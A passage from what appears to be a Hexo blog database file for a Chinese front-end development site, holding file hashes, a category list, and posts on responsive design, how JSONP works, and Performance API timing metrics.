通用篇/index.html","hash":"39638c90a5050713831b7b8c913c88636d55b6cc","modified":1623066586708},{"_id":"public/2021/05/24/HTML/requestAnimationFrame 与 requestIdleCallback/index.html","hash":"52daba7eb0f293bf4c9425a392893ef9e989544f","modified":1623066586708},{"_id":"public/categories/HTML/index.html","hash":"ac7fc07af38ed3650fb2a86ca5cf387fd75401ab","modified":1623066586708},{"_id":"public/tags/HTML/index.html","hash":"789f69a0881f4ee13db85bdc6d0592132a70ee92","modified":1623066586708},{"_id":"source/_posts/React/React 和 Vue 的区别.md","hash":"404fd6e2e0ae41fc0bb066d797d51d22c90f1b41","modified":1623066574740},{"_id":"source/_posts/React/React 中 ref 的使用.md","hash":"7ef214e9e5e70e7b00d47b2f03ab6207665f9607","modified":1623066456201},{"_id":"source/_posts/React/React Hooks.md","hash":"9d0a8d2dcf148695901df0343c77ba546e95fc99","modified":1623066418019},{"_id":"source/_posts/React/React 优化.md","hash":"dddf22e190bd1bed548d840b2b51af4ffac9813b","modified":1623066392131},{"_id":"source/_posts/React/React 生命周期.md","hash":"9b230929f9dddb0971abc3b5c077d6c8c81178d5","modified":1623066544148},{"_id":"source/_posts/React/mixin、hoc、render props、hooks 的比较.md","hash":"2e0452662879cbac7de48a850bef147c4113c646","modified":1623066329734},{"_id":"public/2021/05/26/React/React Hooks/index.html","hash":"ee8bf8418e2677480e9c5a79584306dc6c9416f4","modified":1623066586708},{"_id":"public/2021/05/26/React/React 中 ref 的使用/index.html","hash":"7aba88e44fb1193c2a616d271949222fbc97f561","modified":1623066586708},{"_id":"public/2021/05/26/React/React 和 Vue 的区别/index.html","hash":"6768427d072c1a9932632f6ecf10bb309427086b","modified":1623066586708},{"_id":"public/2021/05/26/React/React 优化/index.html","hash":"9cf7fb5a376f5ff942427b7db2fbee2a19ea1f9c","modified":1623066586708},{"_id":"public/2021/05/26/React/React 生命周期/index.html","hash":"9c13806679c8e28f6744803614d02b73eeb0a872","modified":1623066586708},{"_id":"public/2021/05/26/React/mixin、hoc、render props、hooks 的比较/index.html","hash":"4d498f7535dff4d8a11d5a2bb82980a96149191e","modified":1623066586708},{"_id":"public/archives/2021/05/page/3/index.html","hash":"d5523c499f0ece4f0b333480491988148471b9f4","modified":1623066586708},{"_id":"public/archives/page/9/index.html","hash":"bd8e2c84be9f474bc832e92961bbacf483c0ce44","modified":1623066586708},{"_id":"public/archives/2021/page/9/index.html","hash":"54d3fef597425a4a22d22157983ed090e6d03345","modified":1623066586708},{"_id":"public/page/9/index.html","hash":"a5a41b47c79ac8c1ed3a0f932855464716635456","modified":1623066586708},{"_id":"public/categories/React/index.html","hash":"f349617998e68b60a196d7535249593c5adb0ef7","modified":1623066586708},{"_id":"public/tags/React/index.html","hash":"541c4c5b90ed2f7ff55f2088e0ffa7167702eae0","modified":1623066586708}],"Category":[{"name":"CSS","_id":"cknzv6w1r0004k96rdmqy7j2w"},{"name":"JavaScript","_id":"cknzv6w1v0009k96r0mfugf2t"},{"name":"浏览器","_id":"cknzv6w1w000dk96ran5f33h4"},{"name":"杂项","_id":"cknzv6w1x000gk96r8iesg836"},{"name":"Sass","parent":"cknzv6w1r0004k96rdmqy7j2w","_id":"cko0u90vi0003qd6r8qcj50o4"},{"name":"D3.js","_id":"cko0ubc1t0000rm6rg5z24oip"},{"name":"SVG","_id":"cko0uhcb7000qrm6r7f6b5zfw"},{"name":"JavaScript 编程题","_id":"cko3ytlrz0000lh6rc9r78dt5"},{"name":"HTTP","_id":"cko3z1xzy0001mi6r3nh26dd1"},{"name":"HTTPS","_id":"cko3ze69b000kmi6rgpm35oqy"},{"name":"web 安全","_id":"cko3znwuu0001ox6r2uy9bq92"},{"name":"Web 安全","_id":"cko3zo6rj0007ox6rb5xr5wzu"},{"name":"数据结构","_id":"cko8e8tco0003qf6rhr65gton"},{"name":"算法题","_id":"ckpcce1aw0002l36r8ut84wl3"},{"name":"面试题","_id":"ckpccglty0002ki6rblz24ftk"},{"name":"算法范式","_id":"ckpmjarf70002xv6r50v9crzx"},{"name":"HTML","_id":"ckpmjm7k900025g6r508t6d12"},{"name":"React","_id":"ckpmjxu270002df6rgp4v94lg"}],"Data":[],"Page":[{"title":"分类","date":"2021-04-27T09:20:32.000Z","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\ndate: 2021-04-27 17:20:32\ncomments: false\n---\n","updated":"2021-04-27T11:39:14.993Z","path":"categories/index.html","_id":"cknzv6w1k0000k96r61664vna","layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"标签","date":"2021-04-27T09:53:48.000Z","type":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\ndate: 2021-04-27 17:53:48\ntype: \"tags\"\ncomments: false\n---","updated":"2021-04-27T11:39:16.496Z","path":"tags/index.html","_id":"cknzv6w1p0002k96r1qh0a2wr","layout":"page","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"响应式设计","date":"2021-03-21T16:00:00.000Z","_content":"\n# 响应式设计\n\n### 一、常见布局\n\n1. 固定布局：以像素为基本单位，只设计一套尺寸，不管浏览器宽度；\n2. 响应式布局：以像素为基本单位，设计多套尺寸，不同分辨率下页面样式有所不同；\n3. 弹性布局：以百分比作为基本单位，可以适应一定范围内的所有浏览器宽度，并以最佳的样式展示页面信息；\n4. 混合布局：混合像素、和百分比两种单位作为页面单位，和弹性布局类似；\n\n### 二. 响应式布局原理\n\n本质：页面中的整体布局不变化，各模块中的内容发生变化，主要有三种\n1. 压缩 ----  拉伸；\n2. 平铺 ----  换行；\n3. 添加 ----  删除；\n\n### 三. 实现响应式布局的方法\n\n1. CSS media query\n2. 流体布局 （百分比宽度）\n3. 弹性布局 （display：flex）\n4. javascript 操作 DOM","source":"_posts/CSS/响应式设计.md","raw":"---\ntitle: 响应式设计\ncategories: CSS # 添加博文分类\ntags: CSS # 添加博文标签\ndate: 2021-03-22\n---\n\n# 响应式设计\n\n### 一、常见布局\n\n1. 固定布局：以像素为基本单位，只设计一套尺寸，不管浏览器宽度；\n2. 响应式布局：以像素为基本单位，设计多套尺寸，不同分辨率下页面样式有所不同；\n3. 弹性布局：以百分比作为基本单位，可以适应一定范围内的所有浏览器宽度，并以最佳的样式展示页面信息；\n4. 混合布局：混合像素、和百分比两种单位作为页面单位，和弹性布局类似；\n\n### 二. 响应式布局原理\n\n本质：页面中的整体布局不变化，各模块中的内容发生变化，主要有三种\n1. 压缩 ----  拉伸；\n2. 平铺 ----  换行；\n3. 添加 ----  删除；\n\n### 三. 实现响应式布局的方法\n\n1. CSS media query\n2. 流体布局 （百分比宽度）\n3. 弹性布局 （display：flex）\n4. javascript 操作 DOM","slug":"CSS/响应式设计","published":1,"updated":"2021-04-28T02:23:55.570Z","_id":"cknzv6w1m0001k96rg3qx2ppq","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"响应式设计\"><a href=\"#响应式设计\" class=\"headerlink\" title=\"响应式设计\"></a>响应式设计</h1><h3 id=\"一、常见布局\"><a href=\"#一、常见布局\" class=\"headerlink\" title=\"一、常见布局\"></a>一、常见布局</h3><ol>\n<li>固定布局：以像素为基本单位，只设计一套尺寸，不管浏览器宽度；</li>\n<li>响应式布局：以像素为基本单位，设计多套尺寸，不同分辨率下页面样式有所不同；</li>\n<li>弹性布局：以百分比作为基本单位，可以适应一定范围内的所有浏览器宽度，并以最佳的样式展示页面信息；</li>\n<li>混合布局：混合像素、和百分比两种单位作为页面单位，和弹性布局类似；</li>\n</ol>\n<h3 id=\"二-响应式布局原理\"><a href=\"#二-响应式布局原理\" class=\"headerlink\" title=\"二. 响应式布局原理\"></a>二. 响应式布局原理</h3><p>本质：页面中的整体布局不变化，各模块中的内容发生变化，主要有三种</p>\n<ol>\n<li>压缩 —-  拉伸；</li>\n<li>平铺 —-  换行；</li>\n<li>添加 —-  删除；</li>\n</ol>\n<h3 id=\"三-实现响应式布局的方法\"><a href=\"#三-实现响应式布局的方法\" class=\"headerlink\" title=\"三. 实现响应式布局的方法\"></a>三. 实现响应式布局的方法</h3><ol>\n<li>CSS media query</li>\n<li>流体布局 （百分比宽度）</li>\n<li>弹性布局 （display：flex）</li>\n<li>javascript 操作 DOM</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"响应式设计\"><a href=\"#响应式设计\" class=\"headerlink\" title=\"响应式设计\"></a>响应式设计</h1><h3 id=\"一、常见布局\"><a href=\"#一、常见布局\" class=\"headerlink\" title=\"一、常见布局\"></a>一、常见布局</h3><ol>\n<li>固定布局：以像素为基本单位，只设计一套尺寸，不管浏览器宽度；</li>\n<li>响应式布局：以像素为基本单位，设计多套尺寸，不同分辨率下页面样式有所不同；</li>\n<li>弹性布局：以百分比作为基本单位，可以适应一定范围内的所有浏览器宽度，并以最佳的样式展示页面信息；</li>\n<li>混合布局：混合像素、和百分比两种单位作为页面单位，和弹性布局类似；</li>\n</ol>\n<h3 id=\"二-响应式布局原理\"><a href=\"#二-响应式布局原理\" class=\"headerlink\" title=\"二. 响应式布局原理\"></a>二. 响应式布局原理</h3><p>本质：页面中的整体布局不变化，各模块中的内容发生变化，主要有三种</p>\n<ol>\n<li>压缩 —-  拉伸；</li>\n<li>平铺 —-  换行；</li>\n<li>添加 —-  删除；</li>\n</ol>\n<h3 id=\"三-实现响应式布局的方法\"><a href=\"#三-实现响应式布局的方法\" class=\"headerlink\" title=\"三. 实现响应式布局的方法\"></a>三. 实现响应式布局的方法</h3><ol>\n<li>CSS media query</li>\n<li>流体布局 （百分比宽度）</li>\n<li>弹性布局 （display：flex）</li>\n<li>javascript 操作 DOM</li>\n</ol>\n"},{"title":"JSONP 原理","date":"2021-04-27T09:24:48.000Z","_content":"\n# JSONP 原理\n\n由于同源策略的原因，浏览器限制了 Ajax 请求必须在同一个源中，即**统一协议、域名和端口号**\n\n> 说明： 跨域的 Ajax 请求可以发出，但是必须在服务器端响应头中设置  Access-Control-Allow-Origin：“*”属性，否则在跨域请求的预检请求阶段（`OPTIONS`请求会携带 `Access-Control-Request-Method`、`Access-Control-Request-Headers`等头信息），如果后端不允许此次预检请求，则不会再发送后面真正的请求\n\n\n以下标签可以跨域：\n* <script src=\"...\"></script>\n* <img src=\"...\" />\n* <link rel=\"stylesheet\" href=\"...\">\n* <iframe></iframe>\n\n**JSONP （JSON with Padding）**\n说明: 在浏览器端的 js 中声明回调函数之后，通过 `<script>` 标签向服务器跨域请求数据，服务器将请求结果包裹在回调函数中，并动态执行回调函数。\n安全性： 是一种不安全的通信方式。 `<script>` 会执行跨域服务器中返回的任意 js 代码，只适用于可信的第三方脚本。\n优点： 配置简单，支持旧版浏览器，但不安全，不支持 POST\n\n\n示例：\n* 浏览器端声明 `callbackfunction (data) { console.log(data); }`\n* 动态创建 `<script>` 标签，并将 src 指向跨域地址 http://www.runoob.com/ajax?jsonp=callbackFunction\n* 服务器端返回 `callbackFunction([\"customername1\",\"customername2\"])`;\n* 请求结束后，`<script>` 标签内的 js 代码会自动执行，jsonp 流程结束\n\n\n```js\n// jsonp 实现方式\n\nfunction jsonp ({url, param, callback}) {\n  return new Promise((resolve, reject) => {\n    var script = document.createElement('script')\n    window.callback = function (data) {\n      resolve(data)\n      document.body.removeChild(script)\n    }\n    var param = {...param, callback}\n    var arr = []\n    for (let key in param) {\n      arr.push(`${key}=${param[key]}`)\n    }\n    script.src = `${url}?${arr.join('&')}`\n    document.body.appendChild(script)\n  })\n}\n```","source":"_posts/JavaScript/JSONP 原理.md","raw":"---\ntitle: JSONP 原理\ncategories: JavaScript\ntags: [JSONP, 同源策略]\ndate: 2021-04-27 17:24:48\n---\n\n# JSONP 原理\n\n由于同源策略的原因，浏览器限制了 Ajax 请求必须在同一个源中，即**统一协议、域名和端口号**\n\n> 说明： 跨域的 Ajax 请求可以发出，但是必须在服务器端响应头中设置  Access-Control-Allow-Origin：“*”属性，否则在跨域请求的预检请求阶段（`OPTIONS`请求会携带 `Access-Control-Request-Method`、`Access-Control-Request-Headers`等头信息），如果后端不允许此次预检请求，则不会再发送后面真正的请求\n\n\n以下标签可以跨域：\n* <script src=\"...\"></script>\n* <img src=\"...\" />\n* <link rel=\"stylesheet\" href=\"...\">\n* <iframe></iframe>\n\n**JSONP （JSON with Padding）**\n说明: 在浏览器端的 js 中声明回调函数之后，通过 `<script>` 标签向服务器跨域请求数据，服务器将请求结果包裹在回调函数中，并动态执行回调函数。\n安全性： 是一种不安全的通信方式。 `<script>` 会执行跨域服务器中返回的任意 js 代码，只适用于可信的第三方脚本。\n优点： 配置简单，支持旧版浏览器，但不安全，不支持 POST\n\n\n示例：\n* 浏览器端声明 `callbackfunction (data) { console.log(data); }`\n* 动态创建 `<script>` 标签，并将 src 指向跨域地址 http://www.runoob.com/ajax?jsonp=callbackFunction\n* 服务器端返回 `callbackFunction([\"customername1\",\"customername2\"])`;\n* 请求结束后，`<script>` 标签内的 js 代码会自动执行，jsonp 流程结束\n\n\n```js\n// jsonp 实现方式\n\nfunction jsonp ({url, param, callback}) {\n  return new Promise((resolve, reject) => {\n    var script = document.createElement('script')\n    window.callback = function (data) {\n      resolve(data)\n      document.body.removeChild(script)\n    }\n    var param = {...param, callback}\n    var arr = []\n    for (let key in param) {\n      arr.push(`${key}=${param[key]}`)\n    }\n    script.src = `${url}?${arr.join('&')}`\n    document.body.appendChild(script)\n  })\n}\n```","slug":"JavaScript/JSONP 原理","published":1,"updated":"2021-04-27T09:42:54.671Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknzv6w1p0003k96r9yzq6wkz","content":"<h1 id=\"JSONP-原理\"><a href=\"#JSONP-原理\" class=\"headerlink\" title=\"JSONP 原理\"></a>JSONP 原理</h1><p>由于同源策略的原因，浏览器限制了 Ajax 请求必须在同一个源中，即<strong>统一协议、域名和端口号</strong></p>\n<blockquote>\n<p>说明： 跨域的 Ajax 请求可以发出，但是必须在服务器端响应头中设置  Access-Control-Allow-Origin：“*”属性，否则在跨域请求的预检请求阶段（<code>OPTIONS</code>请求会携带 <code>Access-Control-Request-Method</code>、<code>Access-Control-Request-Headers</code>等头信息），如果后端不允许此次预检请求，则不会再发送后面真正的请求</p>\n</blockquote>\n<p>以下标签可以跨域：</p>\n<ul>\n<li><script src=\"...\"></script></li>\n<li><img src=\"...\" /></li>\n<li><link rel=\"stylesheet\" href=\"...\"></li>\n<li><iframe></iframe></li>\n</ul>\n<p><strong>JSONP （JSON with Padding）</strong><br>说明: 在浏览器端的 js 中声明回调函数之后，通过 <code>&lt;script&gt;</code> 标签向服务器跨域请求数据，服务器将请求结果包裹在回调函数中，并动态执行回调函数。<br>安全性： 是一种不安全的通信方式。 <code>&lt;script&gt;</code> 会执行跨域服务器中返回的任意 js 代码，只适用于可信的第三方脚本。<br>优点： 配置简单，支持旧版浏览器，但不安全，不支持 POST</p>\n<p>示例：</p>\n<ul>\n<li>浏览器端声明 <code>callbackfunction (data) &#123; console.log(data); &#125;</code></li>\n<li>动态创建 <code>&lt;script&gt;</code> 标签，并将 src 指向跨域地址 <a href=\"http://www.runoob.com/ajax?jsonp=callbackFunction\">http://www.runoob.com/ajax?jsonp=callbackFunction</a></li>\n<li>服务器端返回 <code>callbackFunction([&quot;customername1&quot;,&quot;customername2&quot;])</code>;</li>\n<li>请求结束后，<code>&lt;script&gt;</code> 标签内的 js 代码会自动执行，jsonp 流程结束</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// jsonp 实现方式</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">jsonp</span> (<span class=\"params\">&#123;url, param, callback&#125;</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">&#x27;script&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.callback = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">      resolve(data)</span><br><span class=\"line\">      <span class=\"built_in\">document</span>.body.removeChild(script)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> param = &#123;...param, callback&#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> arr = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> param) &#123;</span><br><span class=\"line\">      arr.push(<span class=\"string\">`<span class=\"subst\">$&#123;key&#125;</span>=<span class=\"subst\">$&#123;param[key]&#125;</span>`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    script.src = <span class=\"string\">`<span class=\"subst\">$&#123;url&#125;</span>?<span class=\"subst\">$&#123;arr.join(<span class=\"string\">&#x27;&amp;&#x27;</span>)&#125;</span>`</span></span><br><span class=\"line\">    <span class=\"built_in\">document</span>.body.appendChild(script)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JSONP-原理\"><a href=\"#JSONP-原理\" class=\"headerlink\" title=\"JSONP 原理\"></a>JSONP 原理</h1><p>由于同源策略的原因，浏览器限制了 Ajax 请求必须在同一个源中，即<strong>统一协议、域名和端口号</strong></p>\n<blockquote>\n<p>说明： 跨域的 Ajax 请求可以发出，但是必须在服务器端响应头中设置  Access-Control-Allow-Origin：“*”属性，否则在跨域请求的预检请求阶段（<code>OPTIONS</code>请求会携带 <code>Access-Control-Request-Method</code>、<code>Access-Control-Request-Headers</code>等头信息），如果后端不允许此次预检请求，则不会再发送后面真正的请求</p>\n</blockquote>\n<p>以下标签可以跨域：</p>\n<ul>\n<li><script src=\"...\"></script></li>\n<li><img src=\"...\" /></li>\n<li><link rel=\"stylesheet\" href=\"...\"></li>\n<li><iframe></iframe></li>\n</ul>\n<p><strong>JSONP （JSON with Padding）</strong><br>说明: 在浏览器端的 js 中声明回调函数之后，通过 <code>&lt;script&gt;</code> 标签向服务器跨域请求数据，服务器将请求结果包裹在回调函数中，并动态执行回调函数。<br>安全性： 是一种不安全的通信方式。 <code>&lt;script&gt;</code> 会执行跨域服务器中返回的任意 js 代码，只适用于可信的第三方脚本。<br>优点： 配置简单，支持旧版浏览器，但不安全，不支持 POST</p>\n<p>示例：</p>\n<ul>\n<li>浏览器端声明 <code>callbackfunction (data) &#123; console.log(data); &#125;</code></li>\n<li>动态创建 <code>&lt;script&gt;</code> 标签，并将 src 指向跨域地址 <a href=\"http://www.runoob.com/ajax?jsonp=callbackFunction\">http://www.runoob.com/ajax?jsonp=callbackFunction</a></li>\n<li>服务器端返回 <code>callbackFunction([&quot;customername1&quot;,&quot;customername2&quot;])</code>;</li>\n<li>请求结束后，<code>&lt;script&gt;</code> 标签内的 js 代码会自动执行，jsonp 流程结束</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// jsonp 实现方式</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">jsonp</span> (<span class=\"params\">&#123;url, param, callback&#125;</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> script = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">&#x27;script&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">window</span>.callback = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">      resolve(data)</span><br><span class=\"line\">      <span class=\"built_in\">document</span>.body.removeChild(script)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> param = &#123;...param, callback&#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> arr = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> param) &#123;</span><br><span class=\"line\">      arr.push(<span class=\"string\">`<span class=\"subst\">$&#123;key&#125;</span>=<span class=\"subst\">$&#123;param[key]&#125;</span>`</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    script.src = <span class=\"string\">`<span class=\"subst\">$&#123;url&#125;</span>?<span class=\"subst\">$&#123;arr.join(<span class=\"string\">&#x27;&amp;&#x27;</span>)&#125;</span>`</span></span><br><span class=\"line\">    <span class=\"built_in\">document</span>.body.appendChild(script)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Performance API","date":"2021-04-27T09:21:48.000Z","_content":"\n# Performance API\n\n## performance.timing\n\nperformance对象是全局的，它的 timing 属性是一个对象，它包含了各种与浏览器性能有关的时间数据，提供浏览器处理网页各个阶段的耗时。\n\n![文档加载时间图](https://image-static.segmentfault.com/306/110/3061105775-56fde6dc11135_articlex)\n\n![性能指标](https://pic1.zhimg.com/80/v2-e4e26420d6b681b2b15b9edf9db9d4d0_1440w.jpg)\n\nperformance.timing对象包含下列属性（全部只读）：\n* **navigationStart**：当前浏览器窗口的前一个网页关闭，发生unload事件时的Unix毫秒时间戳。如果没有前一个网页，则等于fetchStart属性。\n* **unloadEventStart**：如果前一个网页与当前网页属于同一个域名，则返回前一个网页的unload事件发生时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。\n**unloadEventEnd**：如果前一个网页与当前网页属于同一个域名，则返回前一个网页unload事件的回调函数结束时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。\n**redirectStart**：返回第一个HTTP跳转开始时的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。\n* **redirectEnd**：返回最后一个HTTP跳转结束时（即跳转回应的最后一个字节接受完成时）的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。\n* **fetchStart**：返回浏览器准备使用HTTP请求读取文档时的Unix毫秒时间戳。该事件在网页查询本地缓存之前发生。\n* **domainLookupStart**：返回域名查询开始时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。\n* **domainLookupEnd**：返回域名查询结束时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。\n* **connectStart**：返回HTTP请求开始向服务器发送时的Unix毫秒时间戳。如果使用持久连接（persistent connection），则返回值等同于fetchStart属性的值。\n* **connectEnd**：返回浏览器与服务器之间的连接建立时的Unix毫秒时间戳。如果建立的是持久连接，则返回值等同于fetchStart属性的值。连接建立指的是所有握手和认证过程全部结束。\n* **secureConnectionStart**：返回浏览器与服务器开始安全链接的握手时的Unix毫秒时间戳。如果当前网页不要求安全连接，则返回0。\n* **requestStart**：返回浏览器向服务器发出HTTP请求时（或开始读取本地缓存时）的Unix毫秒时间戳。\n* **responseStart**：返回浏览器从服务器收到（或从本地缓存读取）第一个字节时的Unix毫秒时间戳。\n* **responseEnd**：返回浏览器从服务器收到（或从本地缓存读取）最后一个字节时（如果在此之前HTTP连接已经关闭，则返回关闭时）的Unix毫秒时间戳。\n* **domLoading**：返回当前网页DOM结构开始解析时（即Document.readyState属性变为“loading”、相应的readystatechange事件触发时）的Unix毫秒时间戳。\n* **domInteractive**：返回当前网页DOM结构结束解析、开始加载内嵌资源时（即Document.readyState属性变为“interactive”、相应的readystatechange事件触发时）的Unix毫秒时间戳。\n* **domContentLoadedEventStart**：返回当前网页DOMContentLoaded事件发生时（即DOM结构解析完毕、所有脚本开始运行时）的Unix毫秒时间戳。\n* **domContentLoadedEventEnd**：返回当前网页所有需要执行的脚本执行完成时的Unix毫秒时间戳。\n* **domComplete**：返回当前网页DOM结构生成时（即Document.readyState属性变为“complete”，以及相应的readystatechange事件发生时）的Unix毫秒时间戳。\n* **loadEventStart**：返回当前网页load事件的回调函数开始时的Unix毫秒时间戳。如果该事件还没有发生，返回0。\n* **loadEventEnd**：返回当前网页load事件的回调函数运行结束时的Unix毫秒时间戳。如果该事件还没有发生，返回0。\n\n\n![加载流程](https://pic4.zhimg.com/80/v2-d80be1162b4d17d7c6ff265c26e30c3f_1440w.jpg)\n\n关键指标数据如下：\n* DNS解析时间：`domainLookupEnd - domainLookupStart`\n* TCP建立连接：`connectEnd - connectStart`\n* 发送请求：`responseStart - requestStart`\n* 接收请求：`responseEnd - responseStart`\n* TTFB：`responseStart - fetchStart`\n* 白屏时间：`domLoading - fetchStart`\n* 解析 DOM 树：`domInteractive - domLoading`\n* 首次可交互时间：`domContentLoadedEventEnd - fetchStart` （粗略计算）\n* DOM Ready 时间：`domComplete - fetchStart`\n* 页面完全加载时间：`loadEventStart - fetchStart`\n* DOMContentLoaded 事件耗时：`domContentLoadedEventEnd - domContentLoadedEventStart`\n* DOMLoad 事件耗时：`loadEventEnd - loadEventStart`","source":"_posts/浏览器/Performance API.md","raw":"---\ntitle: Performance API\ncategories: 浏览器\ntags: [Performance, 性能]\ndate: 2021-04-27 17:21:48\n---\n\n# Performance API\n\n## performance.timing\n\nperformance对象是全局的，它的 timing 属性是一个对象，它包含了各种与浏览器性能有关的时间数据，提供浏览器处理网页各个阶段的耗时。\n\n![文档加载时间图](https://image-static.segmentfault.com/306/110/3061105775-56fde6dc11135_articlex)\n\n![性能指标](https://pic1.zhimg.com/80/v2-e4e26420d6b681b2b15b9edf9db9d4d0_1440w.jpg)\n\nperformance.timing对象包含下列属性（全部只读）：\n* **navigationStart**：当前浏览器窗口的前一个网页关闭，发生unload事件时的Unix毫秒时间戳。如果没有前一个网页，则等于fetchStart属性。\n* **unloadEventStart**：如果前一个网页与当前网页属于同一个域名，则返回前一个网页的unload事件发生时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。\n**unloadEventEnd**：如果前一个网页与当前网页属于同一个域名，则返回前一个网页unload事件的回调函数结束时的Unix毫秒时间戳。如果没有前一个网页，或者之前的网页跳转不是在同一个域名内，则返回值为0。\n**redirectStart**：返回第一个HTTP跳转开始时的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。\n* **redirectEnd**：返回最后一个HTTP跳转结束时（即跳转回应的最后一个字节接受完成时）的Unix毫秒时间戳。如果没有跳转，或者不是同一个域名内部的跳转，则返回值为0。\n* **fetchStart**：返回浏览器准备使用HTTP请求读取文档时的Unix毫秒时间戳。该事件在网页查询本地缓存之前发生。\n* **domainLookupStart**：返回域名查询开始时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。\n* **domainLookupEnd**：返回域名查询结束时的Unix毫秒时间戳。如果使用持久连接，或者信息是从本地缓存获取的，则返回值等同于fetchStart属性的值。\n* **connectStart**：返回HTTP请求开始向服务器发送时的Unix毫秒时间戳。如果使用持久连接（persistent connection），则返回值等同于fetchStart属性的值。\n* **connectEnd**：返回浏览器与服务器之间的连接建立时的Unix毫秒时间戳。如果建立的是持久连接，则返回值等同于fetchStart属性的值。连接建立指的是所有握手和认证过程全部结束。\n* **secureConnectionStart**：返回浏览器与服务器开始安全链接的握手时的Unix毫秒时间戳。如果当前网页不要求安全连接，则返回0。\n* **requestStart**：返回浏览器向服务器发出HTTP请求时（或开始读取本地缓存时）的Unix毫秒时间戳。\n* **responseStart**：返回浏览器从服务器收到（或从本地缓存读取）第一个字节时的Unix毫秒时间戳。\n* **responseEnd**：返回浏览器从服务器收到（或从本地缓存读取）最后一个字节时（如果在此之前HTTP连接已经关闭，则返回关闭时）的Unix毫秒时间戳。\n* **domLoading**：返回当前网页DOM结构开始解析时（即Document.readyState属性变为“loading”、相应的readystatechange事件触发时）的Unix毫秒时间戳。\n* **domInteractive**：返回当前网页DOM结构结束解析、开始加载内嵌资源时（即Document.readyState属性变为“interactive”、相应的readystatechange事件触发时）的Unix毫秒时间戳。\n* **domContentLoadedEventStart**：返回当前网页DOMContentLoaded事件发生时（即DOM结构解析完毕、所有脚本开始运行时）的Unix毫秒时间戳。\n* **domContentLoadedEventEnd**：返回当前网页所有需要执行的脚本执行完成时的Unix毫秒时间戳。\n* 